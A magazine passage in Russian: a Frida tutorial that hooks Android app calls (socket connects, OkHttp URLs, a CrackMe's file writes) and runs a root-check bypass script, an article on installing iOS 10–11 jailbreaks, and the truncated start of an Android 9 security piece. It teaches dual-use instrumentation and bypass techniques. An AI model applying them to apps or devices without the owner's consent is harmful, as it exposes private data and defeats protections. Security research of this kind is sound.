  2028 ms  connect(sockfd=0x90, addr=0x94e86374, addrlen=0x6e)
  2034 ms  connect(sockfd=0x90, addr=0x94e86374, addrlen=0x6e)

 Причина в том, что вто рой аргу мент системного вызова connect() — это ука‐
  затель на структуру sockaddr. Frida не умеет ее парсить и поэтому выводит
  адрес участка памяти, в которой хра нится эта структура. Но! Мы можем изме‐
  нить код, который выпол няет Frida при перехвате системного вызова или фун‐
  кции. А это значит, что мы можем пропарсить sockaddr сами!
    Когда ты запускал команду frida‐trace, то наверняка заметил примерно
  такую строку:


  connect: Auto‐generated handler at "/home/j1m/__handlers__/libc.so/
  connect.js"

  Это автоматически сгенерированный код хука, который Frida выполняет, ког‐
  да подопытное приложение обра щает ся к ука занной функции. Именно он
  ответственен за вывод тех малоинформа тивных строк, которые мы увидели.
 По умолчанию код выглядит так:


  onEnter: function (log, args, state) {
      log("connect(" +
          "sockfd=" + args[0] +
          ", addr=" + args[1] +
          ", addrlen=" + args[2] +
      ")");
  },

 Видно, что хук просто выводит вто рой аргумент как есть. Но мы знаем, что
  второй аргумент системно го вызова connect() — это указатель на структуру
  sockaddr, то есть просто адрес в памяти. Сама структура sockaddr имеет сле‐
 дующий вид:


  struct sockaddr {
      unsigned short    sa_family;    // address family, AF_xxx
      char              sa_data[14];  // 14 bytes of protocol address
  };

 А в случае с сокетами типа AF_INET, которые нам и нужны, такой:


  struct sockaddr_in {
      short            sin_family;   // e.g. AF_INET, AF_INET6
      unsigned short   sin_port;     // e.g. htons(3490)
      struct in_addr   sin_addr;     // see struct in_addr, below
      char             sin_zero[8];  // zero this if you want to
  };
  struct in_addr {
      unsigned long s_addr;          // load with inet_pton()
  };

  То есть сам IP‐адрес находится в этой структуре по смещению 4 байта (short
  sin_family + unsigned short sin_port) и занимает 8 байт (unsigned long). Это зна‐
  чит, что нам нужно добавить к исходному адресу 4, затем прочитать 8 байт
  по полученному адресу и пропарсить их, чтобы получить текстовый IP‐адрес
  с точками. Сделаем это, заменив изна чальный хук таким:


  onEnter: function (log, args, state) {
      var addr = args[1].add("4")
      var ip = Memory.readULong(addr)
      var ipString = [ip & 0xFF, ip >>> 8 & 0xFF, ip >>> 16 & 0xFF, ip
  >>> 24].join('.')
      log("connect(" +
          "sockfd=" + args[0] +
          ", addr=" + ipString +
          ", addrlen=" + args[2] +
      ")");
  },

 Обрати внимание, что мы парсим адрес, начиная с конца, то есть разворачи‐
  ваем его. Это необ ходимо, так как все современные процессоры ARM
  используют little‐endian порядок байтов. Также обрати внимание на класс
  Memory и метод add(), это части API Frida.
    Сохраняем файл и вновь запус каем frida‐trace:


  connect(sockfd=0xbb, addr=173.194.222.139, addrlen=0x10)
  connect(sockfd=0xba, addr=74.125.205.94, addrlen=0x10)

  Вуаля. Правда, есть один нюанс. Так как наш код не умеет различать сокеты
  типа AF_UNIX, AF_INET и AF_INET6 и все их интерпретирует как AF_INET, иног‐
  да он будет выводить несуществующие адреса. То есть он будет пытаться
  парсить имя файла сокета AF_UNIX и выводить его как IP (или пытаться вывес‐
  ти IPv6‐адрес как адрес IPv4). Отбраковать такие адреса очень легко, обычно
  они идут подряд и часто повторя ются. В моем случае это был адрес 101.118.
  47.115.


 ВНЕДРЯЕМСЯ
  Конечно же, возможнос ти Frida гораздо шире, чем перехват обращений
  к нативным функциям и системным вызовам. Если мы взгля нем на упоминав‐
 шийся API Frida, то увидим, что в нем есть объект Java. С его помощью мы
 можем перехватывать обра щения к любым Java‐объ ектам и методам, а зна‐
  чит, изменить практически любой аспект поведения любого при ложения
  для Android (в том числе написанного на Kotlin).
    Начнем с простого — попробуем узнать обо всех загруженных в приложе‐
  ние классах. Создай новый файл  (пусть он называется enumerate.js)
  и добавь в него следующие строки:


  Java.perform(function() {
      Java.enumerateLoadedClasses({
          onMatch: function(className) {
              console.log(className);
          },
          onComplete: function() {}
      });
  });

  Это очень простой код. Сна чала мы вызываем метод Java.perform(), озна‐
  чающий, что мы хотим подклю читься  к виртуальной машине Java (или
  Dalvik/ART в случае Android). Далее мы вызываем метод Java.enumerate‐
  LoadedClasses() и переда ем ему два колбэка: onMatch() будет выпол нен
  при «обнаружении» клас са, onComplete() — в самом конце (как видно, нам
  этот колбэк не нужен, и мы оставляем его пустым).
    Запускаем:


  $ frida ‐U ‐l enumerate.js org.telegram.messenger

 И видим на экране длинный, кажущийся бес конечным список клас сов,
  некоторые из них — часть самого приложения, но подавляющее большинс‐
  тво — стандартные клас сы фреймворка Android (Android загружает весь
 фреймворк в каждый процесс в режиме copy‐on‐write).
    На самом деле нам этот список не особо интересен. Намного инте реснее
  то, что в любой из этих классов можно внедрить свой код, а если быть точ‐
 ным — переписать тело любого метода любого из этих классов. Для при мера
  возьмем такой код:


  Java.perform(function () {
      var Activity = Java.use("android.app.Activity");
      Activity.onResume.implementation = function () {
          console.log("onResume() got called!");
          this.onResume();
      };
  });

 Сначала мы  используем  Java.use(),  что бы  получить  объект‐обертку
  для работы с классом android.app.Activity. Затем мы переписываем его
  метод onResume(), вызывая в конце оригинальный метод (this.onResume).
     Те, кто знаком с разработкой приложений для Android, должны знать, что
  класс Activity предназначен для соз дания «экра нов» приложения. Он имеет
 множество методов, один из которых называ ется onResume(). На самом деле
  это колбэк, который вызывается во время соз дания экрана, а также при воз‐
  врате на него.
    Если ты загрузишь данный скрипт во Frida, запустишь Телеграм, затем
  выйдешь из него, затем снова откроешь, то заметишь, что при каждом воз‐
  врате в Телеграм в терминале будет появлять ся сооб щение «onResume() got
  called!».
    Точно таким же образом мы можем перехватывать нажатия на кнопки:


  Java.perform(function () {
      MainActivity.onClick.implementation = function (v) {
          consle.log('onClick');
          this.onClick(v);
      }
  });

 А вот пример логирования всех URL, к которым обращается при ложе ние:


  Java.perform(function() {
      var httpclient = Java.use("com.squareup.okhttp.v_1_5_1.OkHttp
  Client");
      httpclient.open.overload("java.net.URL").implementation =
  function(url) {
          console.log("request url:");
          console.log(url.toString());
          return this.open(url);
      }
  });

 В данном случае мы внедряемся в очень популярную биб лиотеку OkHttp
  и переписываем ее метод okHttpClient.open(). Остальное дол жно быть
  ясно.


 Frida CodeShare
  У Frida есть официальный репозиторий скриптов, в котором можно найти
  такие полезности, как fridantiroot — комплексный скрипт, позволяющий отклю‐
  чить проверки на root, Universal Android SSL Pinning Bypass — обход SSL Pin‐
  ning, Alert On MainActivity — пример кода, который реализует полноценное
  диалоговое окно Android на JavaScript.
   Лю бой из этих скриптов можно запустить без пред варительного скачива‐
  ния с помощью такой команды:


  $ frida ‐‐codeshare dzonerzy/fridantiroot ‐U ‐f com.example.vulnapp





 ЛОМАЕМ CRACKME
 А теперь давай попробуем взло мать что‐то реаль ное. На просторах интерне‐
  та можно найти множество раз ных CrackMe. Возьмем первый попавшийся.
  Точнее, первый из пяти опубликованных в данном репозитории. Crackme‐
  one.apk записывает файл в свой приватный каталог, а наша задача —
  вытащить содержимое этого файла. Сра зу скажу, что существу ет масса спо‐
  собов сделать это за двадцать секунд, но в то же время это хороший пример,
  чтобы понять, как работать с Frida.
     Итак, скачиваем и устанавлива ем при ложение:


  $ wget https://www.dropbox.com/s/mrjnme2xiv45j4g/crackme‐one.apk
  $ adb install crackme‐one.apk

 Нам предлагают нажать кнопку для записи файла либо ввести ответ для про‐
  верки. Очевидно, чтобы взломать этот CrackMe, мы должны перехватить
  управление в момент записи файла. Но как это сде лать? На самом деле
  очень просто. Большинство приложений для Android используют для записи
  данных либо класс java.io.OutputStream, либо класс java.io.Output‐
  StreamWriter. У каждого из них есть метод write(), который и отвечает
  за запись файла. Нам необ ходимо лишь подменить его на свою реализацию
  и вывести на экран первый аргу мент, который содержит либо массив байтов,
  либо строку:


  Java.perform(function () {
      var os = Java.use("java.io.OutputStreamWriter");
      os.write.overload('java.lang.String', 'int', 'int').implem
  entation = function (string, off, len) {
          console.log(string)
          this.write(string, off, len);
      };
  });

 Запускаем:


  $ frida ‐U ‐f com.reoky.crackme.challengeone ‐l outputstream_write.
  js ‐‐no‐pause

  Вуаля, на экране появляется строка


  poorly‐protected‐secret

 Отмечу три момента:
   1. В этот раз мы использовали метод overload() , так как класс Output‐
     StreamWriter реализует сразу три метода write() с разным набором аргу‐
    ментов.
   2. Мы использовали опцию nopause, которая нужна, если мы хотим
    выполнить холодный старт приложения и при этом не хотим, чтобы Frida
    остановила приложение в самом начале.
   3. На самом деле взломать этот CraсkMe можно было бы, просто перей дя
     в его приватный каталог и прочитав файл (это воз можно, так как у нас
    рутованный смартфон) либо путем декомпиляции приложения (текст лежит
     в открытом виде). Здесь, одна ко, есть нюанс: если бы CrackMe хранил
    строку  в  зашифрованном  виде  и  расшифровывал  ее  только
    перед записью, декомпиляция была бы бес полезна (ну, по крайней мере
    до тех пор, пока ты не извлек бы ключ шифрования и не написал скрипт
    расшифровки).





         Извлечь строку можно было и с помощью декомпилятора


 ВЫВОДЫ
  Frida — очень мощный инстру мент, с помощью которого можно сделать
  с подопытным приложением практичес ки все, что угодно. Но это инстру мент
  не для всех, он требует зна ния JavaScript, понимания принципов работы An‐
  droid и приложений для него. Так что, если ты рядовой скрипт‐кидди, тебе
  остается  довольствоваться  автоматизированными  инс трументами,  соз‐
  данными на основе Frida, например appmon.
ВЗЛОМ

       НОВОЕ
   ПОКОЛЕНИЕ
 ДЖЕЙЛБРЕЙКА

 КАК ВЗЛОМАТЬ IOS 11,
 ЧЕМ ЭТО ГРОЗИТ
 И КАК РАБОТАЕТ НОВЫЙ
 МЕТОД ВЗЛОМА





                                                                             Олег Афонин
                                                                                     Эксперт по мобильной
                                                                                   криминалистике компании
                                                                                        «Элкомсофт»
                                                                                             aoleg@voicecallcentral.com





В конце прошлого года специалист Google Project Zero опуб‐
ликовал экс плоит для уязвимости, присутствующей во всех
версиях iOS 10 и 11 вплоть до 11.1.2. На горизонте замаячи‐
ла соблазнительная возможность джейлбрейка. Насколько
оправдались ожидания любителей взло ма устройств? Чем
грозит  сущес твование  уязвимости  (и  работоспособных
джейлбрейков) обычным пользователям и чем она может
быть полезна для хакеров? Попробуем разобраться.


ПРИ ЧЕМ ЗДЕСЬ GOOGLE?
В сообществе джейлбрейкеров в последние годы дела обстоят неважно.
Во многом это связано не с тем, что свежие версии операционных систем
как‐то особенно безопасны, а с тем, какие деньги платят компании за най‐
денные ошибки. Новые уяз вимости найти очень и очень непросто, а когда их
находят — чаще всего продают самой Apple или охотникам за уязвимос тями.
Соблазн заработать 50–100 тысяч долларов велик, и редко какие уяз вимос ти
становятся достоянием общественности.
  И вот на сце не появляется Google — злейший друг Apple. Да, Apple платит
огромные деньги за воз можность хра нить данные iCloud на серверах Google
(напомним, iCloud — это управляемая Apple комбинация облачных серверов,
принадлежащих Google, Microsoft, Amazon и AT&T), и да, Google выпускает
свой софт для устрой ств под управлением iOS — но это ничуть не мешает
компании публиковать информацию об уяз вимос тях, найденных в лабора‐
тории Google Project Zero.
  Последняя найденная уязвимость (о ней мы уже рассказывали) также
обнаружена сотрудником лаборатории Google Йеном Биром. Уязвимость,
названная tfp0 (производное от task_for_pid(0)), позволила иссле дова‐
телю написать готовый код для эскалации привилегий во всех версиях iOS 10,
некоторых версиях macOS и iOS 11.0–11.1.2.
   Google сообщила об уяз вимости в Apple, Apple выпустила обновление iOS
11.2,  которое  закрыло  уяз вимость.  Впос ледствии информация  о  ней
и готовый исходный код были опуб ликованы.
   Такой ход со стороны Google был встречен неоднозначно как простыми
пользователями, так и сообществом джейлбрейкеров. Многие пользователи
посчитали, что Google перегибает палку; эта точка зрения не лишена осно‐
ваний, особенно если вспомнить, что сведения об уязвимостях в ОС Microsoft
сотрудники Google Project Zero публиковали еще до того, как Microsoft успе‐
вала выпустить заплатки.
  Неоднозначно приняли эту новость и учас тники сообщества джейлбрей‐
керов. Так, некото рые команды разработчиков выпустили свои версии джей‐
лбрейков, просто исполь зовав готовый код — даже не попытавшись интегри‐
ровать Cydia (доступную в виде исходных кодов). Джей Фримен (saurik)
в интервью высказался откровенно негативно как о желающих поскорее
выпустить сырые джейлбрейки на осно ве готового кода (получите и рас‐
пишитесь!), так и о разработчиках, критикующих Cydia.
  Тем не менее какими бы они ни были, но джейлбрейки есть. Давай пос‐
мотрим, как их устанавливать и чем они отличаются между собой. Но преж‐
де — внимательно подготовимся к про цеду ре взлома.


ПОДГОТОВКА К ДЖЕЙЛБРЕЙКУ
Почему‐то практически нигде не рассмат ривается процесс, который дол жен
предварять установку джейлбрейка. Меж ду тем, если что‐то пойдет не так,
возможно, тебе придется обновлять устройство на самую последнюю версию
iOS и восстанавливать данные.
   Итак, что нужно проделать перед тем, как пытать ся взломать устройство?
  Просто создай свежую резервную копию данных при помощи iTunes. Обя‐
зательно задай пароль на резервную копию: даже если ты из тех, кому
«нечего скрывать», наличие пароля на бэкапе позволит тебе восстановить
все данные — в том чис ле и сохраненные пароли из связ ки ключей keychain,
как на текущее устрой ство, так и на другой iPhone или iPad. А вот если ты
пароль  не  установишь,  то  все  клю чи  и  пароли  будут зашифрованы
при помощи аппаратного клю ча, в результате чего вос становить такую резер‐
вную копию в пол ном объеме ты сможешь только на тот же самый телефон
или планшет, с которого соз давал резервную копию. Если что‐то пойдет
не так, ты всегда сможешь восстановить телефон из бэкапа практически
в том же виде, как и до джейлбрейка.
  А вот сохранить блобы SHSH2 тебе, к сожалению, не удастся: Apple прек‐
ратила подписывать все прошивки, для которых дос тупны джейлбрейки.
Исключение — старый iPhone 5 или 5c, для которого доступна (и до сих пор
подписывается) iOS 10.3.3.


УСТАНОВКА
Все новые джейлбрейки, основанные на обнаруженной в Google Project Zero
уязвимости, устанавливаются совершенно одинаково. Впрочем, и уже сущес‐
твующие джейлбрейки Yalu устанавлива ются точно так же. Перечень шагов
простой.
 1. Скачиваем IPA‐файл джейлбрейка (ссылки — ниже) и приложение Cydia
   Impactor.
 2. Подклю чаем iPhone к компьютеру и устанавлива ем доверительные отно‐
   шения, подтвердив запрос  «Trust  this computer?» (обрати внимание:
   для iOS 11 на этом эта пе потребуется ввес ти пароль блокировки устрой‐
   ства; для iOS 10 пароль не требуется).
 3. Запускаем Cydia Impactor и перетаскива ем на него IPA‐файл джей лбрейка.





 4. Cydia Impactor запросит Apple ID и пароль. Вводим Apple ID и пароль
   от любой активной учет ной записи Apple (кста ти, запросто можно исполь‐
   зовать новый, только что созданный акка унт).





 5. IPA‐файл будет подписан (сертификат действует всего семь дней!) и заг‐
   ружен в устрой ство. На этом еще не все; для того чтобы запус тить файл,
   тебе нужно будет под твердить, что ты доверяешь цифровой подписи.
 6. Чтобы подтвердить доверенность цифровой подписи, которой ты под‐
   писал IPA‐файл в момент его загрузки на устройство, зайди в настройки
   Settings → General → Proﬁles → Proﬁles & Device management (если в сис‐
   теме установлен русский язык, то «Нас трой ки → Основные → Профили»
   или «Профили и управление устройством»).





  Обрати внимание: для того чтобы подтвердить доверенный статус сер‐
   тификата, тебе придет ся разрешить телефону выйти в интернет (как
  минимум — установить соединение с сервером ppq.apple.com). Подробно
   процедура описана здесь.
 7. Только после этого ты сможешь наконец запустить сам джейлбрейк. Если
   все пройдет успешно, телефон будет взломан и ты получишь доступ к фай‐
   ловой системе устройства.

Дальнейшее будет зависеть от конкрет ного джей лбрейка. Наличие (и воз‐
можность работы) Cydia, поддержка Cydia Substrate, воз можность внедрения
кода, обход защиты от запус ка неподписанных приложе ний — все эти вещи
могут присутствовать, а могут и не присутство вать в разных ути литах.
  Общее для всех джей лбрейков — это ограниченное время их работы.
После каждой перезагрузки устройства тебе придет ся заново запускать ути‐
литу джейлбрейка на самом устройстве, а раз в семь дней — повторять весь
процесс заново из‐за того, что срок действия цифрового сертификата закон‐
чится. Исключение — наличие зарегистрированного аккаунта для разработ‐
чиков или корпоративного акка унта с соответству ющим Apple ID; впрочем,
использовать такие аккаунты для подписи джейлбрейка — дело дос таточно
рискованное.


УТИЛИТЫ ДЛЯ ВЗЛОМА IOS 10–11.1.2
Итак, какие джейлбрейки на основе описанной уязвимости есть на данный
момент? Их довольно много, но полезных из них — считаные еди ницы. Вот
что мы отобрали:
 • h3lix (iOS 10.0–10.3.3, 32‐bit);
 • Meridian (iOS 10.0–10.3.3, 64‐bit);
 • g0blin (iOS 10.3.x, 64‐bit, A7–A9 only);
 • LiberIOS (iOS 11.0–11.1.2);
 • Electra (iOS 11.0–11.1.2).


                             h3lix: iOS 10 для 32-раз рядных устройств
h3lix — типичный предста витель нового поколения джейлбрейков. Он под‐
держивает все 32‐битные устройства, работающие под управлением всех
версий iOS 10. Сюда входят iPhone 5, 5c, а также 32‐битные iPad и iPod Touch.
Разработчики включили в сос тав джейлбрейка Cydia, так что трудностей
с установкой неподписанных приложений не возникает. Особых проблем
с этим джейлбрейком мы не обна ружили, поэтому можем рекомендовать его
для любых 32‐разрядных устройств на всех версиях iOS 10.


                         Meridian: iOS 10 для 64-битных устройств
Джейлбрейк Meridian поможет взло мать 64‐разрядные устройства (iPhone
5s — iPhone X, а также планшеты iPad соот ветс твующих поколений), работа‐
ющие на любой версии iOS. В нашем тестировании данный джейлбрейк ока‐
зался исключительно кап ризным, так что, если твой телефон работает на iOS
10.2.1 или более старой, лучше используй Yalu или Saigon. Cydia есть в ком‐
плекте; для того чтобы магазин приложений заработал, не забудь нажать ex‐
tract dpkg сразу после джейлбрейка.


          g0blin: iOS 10.3.x, 64-бит, только для устройств на A7–A9
Особняком в теплой компании джейлбрей ков стоит утилита g0blin, которая
может взломать ограниченное число комбинаций устройств и версий iOS.
В частности, поддерживаются модели от iPhone 5s до iPhone 7/Plus вклю‐
чительно, а также планшеты iPad, укомплектованные процессорами поколе‐
ний A7, A8 и A9. Ограничены и поддерживаемые версии iOS: джейлбрейк
работает только на iOS 10.3–10.3.3.
  Для чего нужен такой узкоспециализированный джейлбрейк, если есть
h3lix? G0blin работает чуть более ста бильно, он лучше совместим с теми
устройствами и вер сиями iOS, которые в нем поддерживаются. В первую вер‐
сию (RC1) джейлбрейка входят сервис SSH (dropbear); во вторую (RC2) SSH
не включен, и OpenSSH нужно уста навливать отдельно из Cydia.


                               iOS 11.0–11.2: LiberIOS и Electra
Для iOS 11 существует по крайней мере два готовых джейлбрейка: LiberIOS
и Electra. Оба джейлбрейка используют один и тот же код, однако подходы
разработчиков отличаются.
   Так, разработчик LiberIOS крайне негативно относится к Cydia. Cydia
не включена (и не будет включена) в сос тав утилиты, и использовать джей‐
лбрейк можно разве что в чисто исследова тельских целях.
  А вот разработчик Electra включил в сос тав джейлбрейка как сервис SSH,
так и магазин приложений Cydia. Именно этот джейлбрейк мы рекомендуем
к использованию.


Осо бен ности джейлбрейка iOS 11
В утилитах для взло ма iOS 11 применяется новый подход, названный KPP‐
less. KPP (Kernel Patch Protection) — механизм проверки целос тности ядра,
впервые использованный Apple в iOS 9. Этот механизм проверя ет целос‐
тность ядра системы как в про цес се заг рузки, так и во время работы. Осо‐
бенность механизма KPP в том, что очередная про верка может быть про‐
ведена в случайный момент времени. Если ты взломаешь устройство,
а фоновая служба KPP обна ружит изменения в ядре системы — телефон
просто перезагрузится. KPP был раз работан Apple в первую очередь
для защиты от джейлбрейка, но и про тив зловредного кода он тоже может
помочь (по крайней мере в теории).
  В классических джейлбрейках механизм KPP ста рались отключить. Этот
подход назвали KPP bypass; имен но он исполь зуется в джейлбрейках Pangu
и Yalu.
  В джейлбрейках iOS 11, основанных на новой уяз вимос ти, разработчики
решили обойти KPP дру гим способом. Теперь вмес то того, чтобы модифи‐
цировать ядро, джейлбрейк модифициру ет дру гие части системы —  те,
которые не проверяются механизмом KPP. Да, ничто не мешает Apple
добавить проверку и этих областей файловой системы в очередном обновле‐
нии iOS — но ведь речь идет о «здесь и сейчас»!
   Какие недостатки у нового способа? Он требует серьезной переделки Cy‐
dia Substrate, который полага ется на отсутс твие проверок KPP. На сегод‐
няшний день единственный джейлбрейк, реализовавший поддержку Cydia
на iOS 11, — Electra.
   Если тебя заин тересо вал механизм KPP и способы, которыми его обходят
разработчики утилит для джейлбрейка, — тебе сюда: How Kernel Patch Protec‐
tion Works and How Hackers Bypass KPP.


ВОЗМОЖНОСТЬ ОТКАТА
Имей в виду: установка джейлбрейка в систему может оказаться необ‐
ратимой. Это не значит, что ты не смо жешь восста новить устрой ство через
iTunes или сбросить его к заводским настройкам. Впрочем, попробуем
разобраться, что произойдет в том и другом слу чае.
  Допустим, ты установил джейлбрейк на телефон с iOS  11.1.2. Через
какое‐то время накопившиеся в результате экспериментов ошиб ки привели
к проблемам, мешающим пользоваться устрой ством. Какие у тебя есть вари‐
анты?
   Во‐первых, ты можешь попробовать сбросить телефон к заводским нас‐
тройкам. Твои данные будут уда лены, но следы джей лбрейка (а возможно —
и некоторых твиков) все равно могут остаться в системе, приводя к даль‐
нейшей нестабильности ее работы и делая невозможной корректную уста‐
новку ОТА‐обновле ний. Таким обра зом, сброс к заводским нас тройкам
может помочь, но не когда накопились серьезные проблемы.
  Для устройств Apple всегда можно использовать восстановление устрой‐
ства через iTunes. В этом случае скачается последняя версия iOS в виде пол‐
ной прошивки, которая и будет установлена в телефон.
  А если ты не собираешь ся  уста навливать последнюю версию  iOS,
для которой может и не существо вать джейлбрейка? Если ты хочешь остаться
на той самой версии, на которую ты ста вил джейл?
  Перед тем  как обсуждать возможные варианты,  вкратце напомним,
как работает обновле ние (или переуста новка) iOS. Для того чтобы iPhone
смог установить прошивку, ему потребуется свя заться с сервером Apple
и получить цифровую подпись. Эта цифровая подпись будет действительна
только для конкретного экземпляра устройства и только для конкретной вер‐
сии iOS.
   Как видишь, здесь все карты в руках у Apple. Если сервер компании отка‐
жется подписывать ту или иную версию прошивки, установить ее в свой
телефон или планшет ты не сможешь. Если говорить об iOS 11, Apple давно
прекратила подписывать последнюю версию 11.1.2, для которой работает
джейлбрейк. Таким обра зом, при помощи штатных средств ты сможешь вос‐
становить телефон только на текущую (иногда и предпоследнюю) версию iOS,
которую Apple подписыва ет в нас тоящий момент.
   Если бы Apple сейчас подписывала iOS 11.1.2, то ты смог бы сохранить
блобы SHSH2 по инструкции с 4PDA или одной из многочисленных подоб ных
инструкций. Используя блобы SHSH2, ты смог бы в любой момент в будущем
восстановить свой iPhone на эту вер сию системы. Увы, но сохранение блобов
возможно лишь в момент, когда Apple еще подписывает нужную версию iOS.
  И тем не менее, выход есть! Вместо блобов SHSH2 ты можешь поп‐
робовать сохранить снап шот корневой фай ловой системы APFS сразу после
джейлбрейка. В случае с джейлом Electra нуж ный снапшот корневой фай‐
ловой системы создается в процес се взлома устройства. Восстановив образ
APFS после джейлбрейка, ты сможешь откатиться к заведомо работоспособ‐
ной копии системы.
   Как именно это делается, что за «образ APFS» и где он создается?
   Пользователи, незнакомые с особенностями реализации фай ловой сис‐
темы Apple (APFS), полагают, что снапшот — это что‐то вроде файла, который
сохраняется в каком‐то каталоге. Это не так. Ближай шей аналогией снапшоту
APFS является «образ восстановления» Windows, най ти который можно
в панели «Защита системы».
   Вот как работает Electra в своей релиз ной версии (информация непос‐
редственно от Coolstar, разработ чика джейлбрей ка Electra):
 1. Перед тем как взломать устройство, Electra проверит состояние файловой
   системы устройства (если был уста новлен дру гой джейлбрейк или мно‐
  жество твиков, проверка не будет пройдена).
 2. Если файловая система окажется в «достаточно чистом» состоянии (джей‐
   лбрейк устанавливается на чистую систему, или была установлена одна
   из предварительных сборок Electra — без твиков, модифицирующих сис‐
   темный раздел), будет соз дан снапшот корневой файловой системы APFS.
 3. Если же был установлен другой джей лбрейк или обнаружены другие
   потенциально опасные модификации файловой сис темы, Electra запросит
   подтверждение на продолжение процеду ры взлома.





Отлично, снапшот создан! А как восста новить чистую ОС из этого образа,
а заодно удалить «хвосты», оставшиеся от джейлбрейка? На этом месте я
вынужден притормозить: нужный инстру мент (его название — SemiRestore11)
пока не готов, но Coolstar обещает выпус тить его в ближайшее время.
  В будущем ты сможешь воспользоваться этой утилитой, но с одной ого‐
воркой: восстановлен будет снапшот по состоянию на момент «сразу после
взлома», то есть модификации файловой системы, сделанные во время уста‐
новки джейлбрейка, не будут восстановлены.
   Чтобы полностью уда лить следы джей лбрей ка, тебе нужно будет сбросить
устройство к заводским нас тройкам (Reset → Erase all Contents and Settings).
При сбросе будут удалены все данные из /var, и ты получишь чистую версию
системы (iOS 11.0–11.1.2).
  На данный момент нужно просто ждать. Пользоваться старыми версиями
SemiRestore или неизвестно какими утилитами, най денными неизвес тно где,
категорически не рекомендуется.


Чем это может гро зить
Наличие уязвимости, позволяющей получить пра ва суперпользователя, —
это серьезно. Но так ли страшна данная уяз вимость в iOS для обычного поль‐
зователя?
  Давай посмотрим. Для того чтобы воспользоваться уязвимостью и взло‐
мать устройство, нужно приложить сознательные усилия, проделать ряд нет‐
ривиальных телодвижений и вообще — раз блокировать телефон и установить
доверенное соединение с компь ютером. Для установления доверенного
соединения в iOS 11 пот ребуется не только раз блокировать телефон, но и
ввести пароль блокировки. А если известен пароль блокировки, то безо вся‐
ких уязвимостей можно создать резервную копию телефона (включая все
пароли из браузера — например, пароли от соци альных сетей туда, скорее
всего, попадут); если же резервная копия была защищена паролем, то его
можно сбросить буквально в пару кликов. При помощи пароля блокировки
можно сбросить или изменить пароль от iCloud, заблокировать или удалить
данные со всех устройств, зарегистрированных в той же учетной записи
Apple; наконец, можно легко отвя зать телефон от iCloud, не зная пароля
от Apple ID. Все это мы уже описывали в статье «Что можно сделать с iPhone,
зная пасскод. Как сливают данные, уводят iCloud и блокируют остальные
устройства».
   Так какую допол нитель ную опас ность представляет собой най денная уяз‐
вимость? Если говорить об обычном пользователе, то, пожалуй, никакой.
Более того: обычный пользователь, ско рее всего, никогда с ней не столкнет‐
ся: все приложения в App Store модерируются, и программу, эксплуати‐
рующую данную уязвимость, туда не пропустят.
  Джейлбрейком может вос пользоваться полиция для того, чтобы извлечь
дополнительную информа цию из устройства (физическое извлечение дан‐
ных, к примеру, при помощи Elcomsoft iOS Forensic  Toolkit). Проделать
это можешь и ты, но есть ли в этом смысл? Если сравнивать с тем, что можно
извлечь из обычной резервной копии (с паролем), то физическое извлечение
данных даст доступ к скачанным сообщениям электронной почты, сис темным
логам и подробной исто рии местоположения устройства. Можно получить
доступ к песочницам приложений — например, проанализировать перепис ку
в Telegram, WhatsApp или Facebook Messenger. Можно просмотреть времен‐
ные файлы браузера. Для полиции, безус ловно, полез ная информация,
но нужно ли это тебе? Если учесть, что полезных твиков для iOS 11 практичес‐
ки нет (а полезность старых в новой версии ОС под большим вопросом), то
джейлбрейк iOS 11 становится уделом энту зиастов‐разработчиков, спе‐
циалистов по безопасности и полиции.


        WWW

                      Если тебя заинтересовала тема джейлбрейков
                       свежих версий iOS — добро пожаловать на сле‐
                    дующие ресурсы:
                  •Jailbreak update: a summary  of current tools.
                        Здесь  под робно   разобраны   особенности
                        реализации последних KPP‐less джейлбрейков;
                        обсуждаются   проблемы   Cydia   Substrate
                       и независимого решения Substitute.
                  •Electra  jailbreak  for iOS 11.0–11.1.2. В этой
                           статье описаны особен ности конкретного джей‐
                        лбрейка — Electra, интересного целым рядом
                        особенностей  (KPP‐less,  поддержка  Cydia,
                         снапшот APFS).



ЗАКЛЮЧЕНИЕ
Мы рассмотрели ряд утилит для джейлбрейка смартфонов и планшетов,
работающих под управлением iOS 10 и 11 (до версии 11.1.2). История их
появления вызывает противо речивые  чувства. Правильно ли поступает
Google, публикуя информацию об уяз вимостях и выкладывая, по сути, готовый
код для взлома устройств? У меня не сложилось окончательного мнения
по этому поводу.
ПРИВАТНОСТЬ

    НОВАЯ БРОНЯ
  ANDROID 9





                                                                     Евгений Зобнин
                                                                          Редактор Unixoid и Mobile
                                                                                      zobnin@glc.ru


    КАК ANDROID 9 БУДЕТ ЗАЩИЩАТЬ
    ПРИВАТНОСТЬ И БЕЗОПАСНОСТЬ
          ПОЛЬЗОВАТЕЛЕЙ





Восьмого марта  Google  предста вила  предваритель ный
выпуск Android  P, который почти со стопроцен тной веро‐
ятностью вскоре сменит имя на Android 9. В новой версии
в очередной раз изменился интерфейс, появились новые
функции панели уведомлений, поддержка HDR, двух камер,
но наше внимание, как всегда, прив лекает нечто гораздо
более интерес ное: безопасность и новые механизмы огра‐
ничений.


ЗАПРЕТ НА ФОНОВОЕ ИСПОЛЬЗОВАНИЕ КАМЕРЫ И МИКРОФОНА
Об одном из самых заметных security‐новшеств Android стало извес тно
еще до выхода превью Android P, писали о нем и мы. Это, конечно же, запрет
на использование камеры, микрофона и любых сенсоров при ложе ниями,
которые находят ся в сос тоянии Idle, то есть свернуты и работают в фоне. Так
что разного рода малварь, которая любит снимать и слушать происходящее
вокруг, теперь дол жна отвалить ся.
  Но есть один нюанс: как быть с софтом, предназначенным для поиска
смартфона? Есть множес тво приложений, поз воляющих удаленно снимать
и прослушивать происходящее, чтобы быс трее найти свой украденный смар‐
тфон.
  Для этого Google в очередной раз предлагает использовать так называ‐
емый foreground service. Это специальный тип фоновой службы, которая име‐
ет уведомление в панели уведомлений, а потому заметна пользователю. Ник‐
то не мешает тому же пользователю скрыть это уведомление стандартными
средствами.


ЗАПРЕТ НА CLEARTEXT HTTP
Второе важное нововведение Android P — полный запрет на использование
HTTP без TLS (то есть без шифрования) для всех при ложе ний, собранных
для новой версии Android. Дру гими сло вами, если в build.prop приложения
указан targetSdkVersion больше 27, то приложение не сможет подключать‐
ся к хостам по HTTP.
   Это ограничение тем не менее можно обойти, если указать в файле нас‐
троек безопасности  сети  (network_security_config.xml)  список  раз‐
решенных доменов:


<domain‐config cleartextTrafficPermitted="false">
    <domain includeSubdomains="true">secure.example.com</domain>
</domain‐config>


ШИФРОВАНИЕ РЕЗЕРВНЫХ КОПИЙ
Пока эта функция еще не активиро вана, но в следующих выпусках Android P
можно будет указать пароль, без которого невоз можно восстановить резер‐
